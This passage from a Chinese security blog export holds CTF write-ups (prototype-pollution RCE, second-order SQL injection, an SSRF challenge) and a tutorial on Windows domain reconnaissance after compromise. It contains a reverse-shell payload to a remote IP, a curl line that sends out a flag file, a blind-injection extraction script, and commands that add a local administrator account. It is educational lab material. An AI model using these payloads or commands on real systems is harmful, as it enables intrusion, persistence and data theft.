&#125;)<br></code></pre></td></tr></table></figure><p>那我们只要控制id为__ proto __即可污染。</p><p>这里一开始传了参数发现会报错给我整不会了</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240320173335763.png" alt="image-20240320173335763"></p><p>去看了wp说报错也不影响。</p><p>那我就先试了一下污染成ls，但是没有回显</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">id=__proto__&amp;author=ls&amp;raw=hhh<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240320173550096.png" alt="image-20240320173550096"></p><p>然后用了一下curl是能监听到的，那就可以直接反弹shell了</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">id=__proto__&amp;author=bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1&amp;raw=hhh<br></code></pre></td></tr></table></figure><blockquote><p>难绷弹不回来不知道为什么，那就用curl吧。。。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">id=__proto__&amp;author=curl &lt;主机ip&gt; -d `cat /flag`&amp;raw=hhh<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240320174451680.png" alt="image-20240320174451680"></p><p>参考文章：<a href="https://blog.csdn.net/m0_73512445/article/details/135079967">https://blog.csdn.net/m0_73512445/article/details/135079967</a></p><h1 id="网鼎杯-2018-unfinish"><a href="#网鼎杯-2018-unfinish" class="headerlink" title="[网鼎杯 2018]unfinish"></a>[网鼎杯 2018]unfinish</h1><p>这题的考点是二次注入，还不会二次注入先学习一下，参考文章：<a href="https://www.cnblogs.com/jackie-lee/p/16124022.html">https://www.cnblogs.com/jackie-lee/p/16124022.html</a></p><blockquote><p>总结一下就是二次利用恶意数据，第一次发送的恶意数据经过转义后存入数据库，但之后从数据取出数据利用的时候并没有转义，那这个时候我们的恶意数据就会生效。</p></blockquote><p>进去就给了一个login.php，扫了一下发现还有register.php</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240326000952219.png" alt="image-20240326000952219"></p><p>随便注册一个账号登录进去之后就是一张图片</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240326001047845.png" alt="image-20240326001047845"></p><p>可以看到上图的左侧中会回显一个用户名，这就是第二次利用数据库中的数据，那应该就是在注册的用户名上动手脚了</p><p>在注册页面的用户名输了一下逗号发现被过滤了</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240326002729728.png" alt="image-20240326002729728"></p><p>那我们就先去爆破一下看看过滤了什么关键词</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240326003157517.png" alt="image-20240326003157517"></p><p>看到似乎是只过滤了information和逗号</p><p>猜测一下sql语句如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">select username from table where username = &#x27;传递的参数&#x27;<br></code></pre></td></tr></table></figure><p>我们去注册一下用户名0’ and ‘1 看一下，可以发现用户名变成了0，即存在二次注入</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240328145045188.png" alt="image-20240328145045188"></p><p>这里可以了解一下MySQL中字符串的运算</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240328144630707.png" alt="image-20240328144630707"></p><p>执行select ‘0’+database()变成了0：</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240328144719610.png" alt="image-20240328144719610"></p><p>不过用下面的查询方式就能知道数据库名的第一个字符的ascii码</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240328144824861.png" alt="image-20240328144824861"></p><p>题中过滤了逗号可以用下面的方式</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240328144917362.png" alt="image-20240328144917362"></p><p>然后我们就可以进行盲注，因为过滤了information，所以wp猜测表名为flag，只能说很猜谜。</p><p>那脚本如下，因为邮箱不能重复注册，所以每次注册都要不一样（不想写了偷个懒）</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag</span>():<br>    flag = <span class="hljs-string">&#x27;&#x27;</span><br>    url = <span class="hljs-string">&#x27;&#x27;</span><br>    register_url = url + <span class="hljs-string">&#x27;register.php&#x27;</span><br>    login_url = url + <span class="hljs-string">&#x27;login.php&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>):<br>        time.sleep(<span class="hljs-number">0.5</span>)<br>        register_data = &#123;<span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;&#123;&#125;@1.com&quot;</span>.<span class="hljs-built_in">format</span>(i),<br>                 <span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;0&#x27;+ascii(substr((select * from flag) from &#123;&#125; for 1))+&#x27;0&quot;</span>.<span class="hljs-built_in">format</span>(i), <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>&#125;<br>        login_data = &#123;<span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;&#123;&#125;@1.com&quot;</span>.<span class="hljs-built_in">format</span>(i), <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>&#125;<br>        requests.post(register_url, data=register_data)<br>        response_login = requests.post(login_url, data=login_data)<br>        bs = BeautifulSoup(response_login.text, <span class="hljs-string">&#x27;html.parser&#x27;</span>) <br>        username = bs.find(<span class="hljs-string">&#x27;span&#x27;</span>, class_=<span class="hljs-string">&#x27;user-name&#x27;</span>)  <span class="hljs-comment"># 取返回页面数据的span class=user-name属性</span><br>        number = username.text  <br>        flag += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(number))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\r&quot;</span>, end=<span class="hljs-string">&quot;&quot;</span>)<br>        <span class="hljs-built_in">print</span>(flag,end=<span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    get_flag()<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240328150712672.png" alt="image-20240328150712672"></p><blockquote><p>不过还是觉得很奇怪，按照上面的查询语句不应该是为空嘛查询出来的值？</p><p>网上也没找到源码不清楚具体是怎么样的</p></blockquote><p>参考文章：<a href="https://juejin.cn/post/7158228802844229662#heading-1">https://juejin.cn/post/7158228802844229662#heading-1</a></p><h1 id="网鼎杯-2020-玄武组-SSRFMe"><a href="#网鼎杯-2020-玄武组-SSRFMe" class="headerlink" title="[网鼎杯 2020 玄武组]SSRFMe"></a>[网鼎杯 2020 玄武组]SSRFMe</h1><p>题目源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_inner_ip</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$match_result</span>=<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/&#x27;</span>,<span class="hljs-variable">$url</span>);<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$match_result</span>)<br>    &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;url fomat error&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">try</span><br>    &#123;<br>        <span class="hljs-variable">$url_parse</span>=<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);<br>    &#125;<br>    <span class="hljs-keyword">catch</span>(<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>)<br>    &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;url fomat error&#x27;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-variable">$hostname</span>=<span class="hljs-variable">$url_parse</span>[<span class="hljs-string">&#x27;host&#x27;</span>];<br>    <span class="hljs-variable">$ip</span>=<span class="hljs-title function_ invoke__">gethostbyname</span>(<span class="hljs-variable">$hostname</span>);<br>    <span class="hljs-variable">$int_ip</span>=<span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-variable">$ip</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-string">&#x27;127.0.0.0&#x27;</span>)&gt;&gt;<span class="hljs-number">24</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">24</span> || <span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-string">&#x27;10.0.0.0&#x27;</span>)&gt;&gt;<span class="hljs-number">24</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">24</span> || <span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-string">&#x27;172.16.0.0&#x27;</span>)&gt;&gt;<span class="hljs-number">20</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">20</span> || <span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-string">&#x27;192.168.0.0&#x27;</span>)&gt;&gt;<span class="hljs-number">16</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">16</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">safe_request_url</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">check_inner_ip</span>(<span class="hljs-variable">$url</span>))<br>    &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$url</span>.<span class="hljs-string">&#x27; is inner ip&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br>        <span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br>        <span class="hljs-variable">$result_info</span> = <span class="hljs-title function_ invoke__">curl_getinfo</span>(<span class="hljs-variable">$ch</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result_info</span>[<span class="hljs-string">&#x27;redirect_url&#x27;</span>])<br>        &#123;<br>            <span class="hljs-title function_ invoke__">safe_request_url</span>(<span class="hljs-variable">$result_info</span>[<span class="hljs-string">&#x27;redirect_url&#x27;</span>]);<br>        &#125;<br>        <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br>        <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$output</span>);<br>    &#125;<br><br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$url</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$url</span>))&#123;<br>        <span class="hljs-title function_ invoke__">safe_request_url</span>(<span class="hljs-variable">$url</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-comment">// Please visit hint.php locally.</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf 刷题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网渗透体系建设-信息搜集</title>
      <link href="/2024/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BD%93%E7%B3%BB%E5%BB%BA%E8%AE%BE-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
      <url>/2024/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BD%93%E7%B3%BB%E5%BB%BA%E8%AE%BE-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><p>当渗透测试人员通过 Web 渗透或其他方式获得服务器主机的权限后，需要以该主机为跳板，对其内网环境进行渗透。对于攻陷的第一台主机，其在内网中所处的网络位置当前登录的用户、该用户有什么样的权限、其操作系统信息、网络配置信息及当前运行的进程信息等都是未知的，这就需要测试人员以当前主机为中心进行信息收集。</p><h1 id="本机基础信息搜集"><a href="#本机基础信息搜集" class="headerlink" title="本机基础信息搜集"></a>本机基础信息搜集</h1><p><strong>查看当前用户、权限</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">whoami /all<br></code></pre></td></tr></table></figure><p>查看当前用户以及当前用户所处的用户组、所拥有的特权等信息，测试<br>人员可以对当前用户所拥有的特权有一个大致的了解，并综合判断是否需要提升权限。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240318094322829.png" alt="image-20240318094322829"></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240318094352206.png" alt="image-20240318094352206"></p><p><strong>查看网络配置信息</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ipconfig /all<br></code></pre></td></tr></table></figure><p>查看当前主机的网络配置情况，包括主机的IP 地址、主机名、各网络适配器的信息可以从中判断出当前主机所处的内网网段</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240318094527225.png" alt="image-20240318094527225"></p><p><strong>查看主机路由信息</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">route print<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240318094752859.png" alt="image-20240318094752859"></p><p>在路由表中的“网络目标”都是主机可以直接访问到的，测试人员在后续的横向渗透中可以尝试探测相关地址段的存活主机。</p><p><strong>查看操作系统信息</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">systeminfo<br>systeminfo | findstr /B /C:&quot;0S Name&quot; /C:&quot;0S Version&quot; # 查看操作系统及版本<br>systeminfo | findstr /B /C:&quot;0S 名称&quot; /C:&quot;0S 版本&quot; #查看操作系统及版本<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240318095114506.png" alt="image-20240318095114506"></p><p><strong>查看端口连接信息</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">netstat -ano<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240318133421621.png" alt="image-20240318133421621"></p><p>这里可以看到有哪些外部主机与本机建立连接，从这里可以收集内网地址段的信息，如果有内网主机连接就会显示地址信息，我这里连个百度网站来看看外部地址的变化</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240318133826701.png" alt="image-20240318133826701"></p><p><strong>查看当前会话列表</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">net session<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240318134119130.png" alt="image-20240318134119130"></p><p>查看当前主机与所连接的客户端主机之间的会话，我这里还没有建立连接</p><p><strong>查看当前网络共享信息</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">net use<br></code></pre></td></tr></table></figure><p>查看当前主机与其他主机远程建立的网络共享连接</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240318134359209.png" alt="image-20240318134359209"></p><p><strong>查看当前进程信息</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">tasklist<br>tasklist /SVC<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240318134424067.png" alt="image-20240318134424067"></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240318134445449.png" alt="image-20240318134445449"></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">wmic process get Name,ProcessId,ExecutablePath<br></code></pre></td></tr></table></figure><p>该命令可以i查询主机进程信息，并过滤出进程的路径、名称和PID<img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240318134935916.png" alt="image-20240318134935916"></p><p>WMIC 是微软为 Windows管理规范(Windows Management Instrumentation，WMI)提供的一个命令行工具，提供从命令行接口和批处理脚本执行系统管理的支持。</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">wmic process where Name=&quot;conhost.exe&quot; get ExecutablePath<br></code></pre></td></tr></table></figure><p>该命令可以查看指定进程的路径信息</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240318135201960.png" alt="image-20240318135201960"></p><p><strong>查看当前服务信息</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">wmic service get Caption, Name,PathName, StartName, State<br></code></pre></td></tr></table></figure><p>该命令查看当前所有服务的信息，并过滤出服务的名称、路径、创建时间、运行状态信息。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240318181750072.png" alt="image-20240318181750072"></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">wmic service where Name=&quot;themes&quot; get Caption,PathName,State<br></code></pre></td></tr></table></figure><p>查看指定服务的信息，并过滤出服务名称、路径和运行状态</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240318182232588.png" alt="image-20240318182232588"></p><p><strong>查看计划任务信息</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">schtasks /query /v /fo list<br></code></pre></td></tr></table></figure><p>该命令查看当前主机上所有的计划任务</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240318182513357.png" alt="image-20240318182513357"></p><p><strong>查看自启程序信息</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">wmic startup get Caption,Command，Location，User<br></code></pre></td></tr></table></figure><p>该命令查看当前主机上所有的自启程序信息，并过滤出程序名称、所执行的命令、程序的路径所属用户</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240318182709052.png" alt="image-20240318182709052"></p><p><strong>查看系统补丁安装信息</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">wmic qfe get Caption,Description,HotFixID,InstalledOn<br></code></pre></td></tr></table></figure><p>查看当前主机安装的补丁列表，并过滤出补丁链接、名称、描述、补丁编号以及安装时间；通常，测试人员可以根据目标主机的操作系统版本和缺少的补丁来辅助后面的提权操作。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240318214819594.png" alt="image-20240318214819594"></p><p><strong>查看应用安装信息</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">wmic product get Caption,Version<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240318214855646.png" alt="image-20240318214855646"></p><p><strong>查看本地用户&#x2F;组信息</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">net user<br>net user &lt;username&gt; #查看指定用户详细信息<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240318215359151.png" alt="image-20240318215359151"></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">net localgroup administrators #查看本地管理员组<br></code></pre></td></tr></table></figure><p>可以看到，本地管理员组中除了本地管理员 Administrator，还包含域全局组clown，其在该主机加入域时自动被添加到计算机本地Administrators 组中，所以Domain Admins 组拥有该计算机的管理权限，那么我们就可以创建一个新的本地用户加入到本地管理员组</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240318215328201.png" alt="image-20240318215328201"></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">net user &lt;username&gt; &lt;password&gt; /add  #创建本地用户<br>net localgroup administrators &lt;username&gt; /add  #将用户加入本地管理员组<br></code></pre></td></tr></table></figure><p><strong>查看当前登陆用户</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">query user<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240318215825045.png" alt="image-20240318215825045"></p><h1 id="域内信息搜集"><a href="#域内信息搜集" class="headerlink" title="域内信息搜集"></a>域内信息搜集</h1><p><strong>判断是否存在域环境</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">net config workstation<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324193823102.png" alt="image-20240324193823102"></p><p>查看当前工作站的信息，包括当前计算机名、用户名、系统版本、工作站、登录的域等</p><p><strong>查看域用户信息</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">net user /domain  #查看所有的域用户<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324194158121.png" alt="image-20240324194158121"></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">net user &lt;username&gt; /domain #查看指定域用户信息<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324194257681.png" alt="image-20240324194257681"></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">wmic useraccount get Caption,Domain,Description #获取所有用户的SID、所属域和用户描述信息<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324195119836.png" alt="image-20240324195119836"></p><blockquote><p>注意，只有域用户才有权限执行域内查询操作。而计算机本地用户除非提升为本地系统权限，否则只能查询本机信息，无法查询域内信息并提示“拒绝访问”。这是因为，在域环境中，所有与域有关的查询都需要通过域控制器来实现，并且需要经过Kerberos协议进行认证。</p></blockquote><p><strong>查看域用户组信息</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">net group /domain #列出域内的所有用户组<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324195844774.png" alt="image-20240324195844774"></p><p>还可以通过上面的信息来指定用户组来查询详细信息</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">net group &quot;Domain Admins&quot; /domain #比如这个查询域管理员组的用户<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324200516235.png" alt="image-20240324200516235"></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">net group &quot;Domain Computers&quot; /domain #可以得到域内所有的客户端主机<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324200614099.png" alt="image-20240324200614099"></p><p>下面是一些常见组</p><table><thead><tr><th>域组名称</th><th>说明</th></tr></thead><tbody><tr><td>Domain Admins</td><td>域管理员组，包括所有的域管理员用户</td></tr><tr><td>Domain Computers</td><td>域成员主机组，包括加入域的所有工作站和服务器</td></tr><tr><td>Domain Controllers</td><td>域控制器组，包括域中的所有域控制器</td></tr><tr><td>Domain Guests</td><td>域来宾组，包括域中所有的来宾用户</td></tr><tr><td>Domain Users</td><td>域用户组，包括所有域用户</td></tr><tr><td>Enterprise Admins</td><td>企业系统管理员组，适用于域林范围</td></tr></tbody></table><blockquote><p>在默认情况下，Domain Admins 组和Enterprise Admins 组中的用户对域内所有域控制器和域成员主机拥有完全控制权限。Enterprise Admins 组是一个通用组，是域林的根域中的一个组，并且其中的成员对域林中的所有域拥有完全控制权限而 Domain Admins 组是一个全局组，只对本域拥有完全控制权限。</p></blockquote><p><strong>查看域内密码策略</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">net accounts /domain #查询域内用户的密码策略<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324201409096.png" alt="image-20240324201409096"></p><p><strong>查看域控制器列表</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">net group &quot;Domain Controllers&quot; /domain<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324202036188.png" alt="image-20240324202036188"></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">nltest /DCLIST:hacke.testlab  #用于查询指定域内的域控主机列表<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324202555802.png" alt="image-20240324202555802"></p><p><strong>查看主域控制器</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">net time /domain<br></code></pre></td></tr></table></figure><p>在域环境中，主域控制器会同时被用作时间服务器，使得域中所有计算机的时钟同步。执行以下命令，通过查询时间服务器来找到主域控制器的名称。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324202703091.png" alt="image-20240324202703091"></p><p><strong>定位域控制器</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ping DC.hacke.testlab<br></code></pre></td></tr></table></figure><p>通过上面知道目标主机的主机名后，可以直接对主机名执行ping命令，根据执行返回的内容即可得知目标主机在内网中的IP地址。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324202858493.png" alt="image-20240324202858493"></p><p>除此之外，域控制器往往会被用作DNS服务器，所以找到当前主机的DNS服务器地址也可以定位域控。</p><p><strong>查看信任关系</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">nltest /domain_trusts<br></code></pre></td></tr></table></figure><p>域信任用于多域环境中的跨域资源的共享。一般情况下，一个域的用户只能访问本域内的资源，无法访问其他域的资源，而要想不同域之间实现互访就需要建立域信任。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324203208639.png" alt="image-20240324203208639"></p><h1 id="内网资源探测"><a href="#内网资源探测" class="headerlink" title="内网资源探测"></a>内网资源探测</h1><p>在内网渗透中，测试人员往往需要通过各种内网扫描技术来探测内网资源的情况，为后续的横向渗透做准备，通常需要发现内网存活的主机，并探测主机的操作系统、主机开放了哪些端口、端口上运行了哪些服务、服务的当前版本是否存在已知漏洞等信息。这些信息可以帮助测试人员发现内网的薄弱资源，确定后续的攻击方向。</p><h2 id="发现内网存活主机"><a href="#发现内网存活主机" class="headerlink" title="发现内网存活主机"></a>发现内网存活主机</h2><p>渗透测试中可以根据主机情况，上传工具进行主机存货探测，也可以借助内网代理或者路由转发对目标主机所处的局域网进行探测。</p><p><strong>基于ICMP发现存活主机</strong></p><p>ping命令就是利用ICMP数据报来确认主机是否存活，下面命令可以循环探测整个局域网C段中存活的主机</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.30.%I | findstr &quot;TTL=&quot;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324204850543.png" alt="image-20240324204850543"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">for /L %I in (1,1,254)：这是一个 for 循环语句，用于迭代从 1 到 254 的数字。%I 是一个临时变量，它将在每次迭代中保存当前的数字。<br><br>@ping -w 1 -n 1 192.168.30.%I：在每次迭代中，该命令通过 ping 命令向局域网中的一个主机发送一个 ICMP 回显请求（ping 请求）。-w 1 指定超时时间为 1 毫秒，-n 1 指定只发送一个 ping 请求。192.168.30.%I 是要 ping 的目标主机的 IP 地址，其中 %I 表示当前迭代的数字。<br><br>| findstr &quot;TTL=&quot;：将前一个命令的输出通过管道传递给 findstr 命令，并使用 &quot;TTL=&quot; 作为过滤条件。findstr 命令用于在输出中查找包含指定文本的行。在这种情况下，它将筛选包含 &quot;TTL=&quot; 的行，因为这是 ICMP 回显响应中的一个标识符。<br><br>/L表示数字类型的循环，除此之外还有下面这些：<br>/F：用于从文件中读取内容进行循环。可以指定要读取的文件路径，并使用特定的分隔符将文件内容拆分成多个部分进行迭代。<br><br>/R：用于递归地在目录结构中进行循环。可以指定一个目录路径，并在指定的目录及其子目录中进行递归遍历。<br><br>/D：用于循环遍历指定目录中的文件夹。<br><br>/IN：用于指定一个字符串列表，将列表中的每个字符串作为循环的一部分进行迭代。<br></code></pre></td></tr></table></figure><p><strong>基于 NetBIOS(网络基本输入&#x2F;输出系统)协议发现存活主机</strong></p><p>NetBIOS 提供 